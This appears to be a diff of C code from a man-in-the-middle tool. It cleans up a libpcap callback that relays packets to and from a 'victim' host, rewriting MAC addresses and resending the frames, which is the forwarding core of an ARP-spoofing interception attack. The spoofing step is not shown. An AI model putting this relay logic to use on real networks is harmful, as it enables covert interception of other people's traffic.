@@ -24,9 +24,7 @@ void PacketCallback(u_char* args, const struct pcap_pkthdr *header, const u_char
         if (memcmp(&packet[30], gLocalIP, 4) &&
             IsInTable(&packet[26], victimMAC))
         {
-            printf("send\n");
-            u_char temPacket[65536];
-            //u_char* temPacket = malloc(header->len);
+            u_char* temPacket = malloc(header->len);
             if (temPacket)
             {
                 memcpy(temPacket, packet, header->len);
@@ -34,34 +32,25 @@ void PacketCallback(u_char* args, const struct pcap_pkthdr *header, const u_char
                 memcpy(&temPacket[6], gLocalMAC, 6);
                 // change mac address.
                 pcap_sendpacket(*gPcapHandle, temPacket, header->len);
-                //free(temPacket);
+                free(temPacket);
             }
         }
         // receiver -> sender
         else if (memcmp(&packet[26], gLocalIP, 4) &&
                 IsInTable(&packet[30], victimMAC))
         {
-            printf("receive %d - ", header->len);
-            //u_char temPacket[65536];
             u_char* temPacket = malloc(header->len);
             if (temPacket)
             {
                 memcpy(temPacket, packet, header->len);
-                printf("%x:%x:%x:%x:%x:%x -> ", temPacket[0], temPacket[1], temPacket[2], temPacket[3], temPacket[4], temPacket[5]);
                 memcpy(temPacket, victimMAC, 6);
                 memcpy(&temPacket[6], gLocalMAC, 6);
-                printf("%x:%x:%x:%x:%x:%x", temPacket[0], temPacket[1], temPacket[2], temPacket[3], temPacket[4], temPacket[5]);
                 // change mac address.
                 result = pcap_sendpacket(*gPcapHandle, temPacket, header->len);
-                printf(" - %d\n", result);
-                if (result == -1) printf("%s\n", pcap_geterr(*gPcapHandle));
                 free(temPacket);
             }
         }
     }
-    // check IP
-    // pcap_sendpacket();
-    // check packet and rely packet;
 }
 
 static void *ThreadFunction(void *arg)
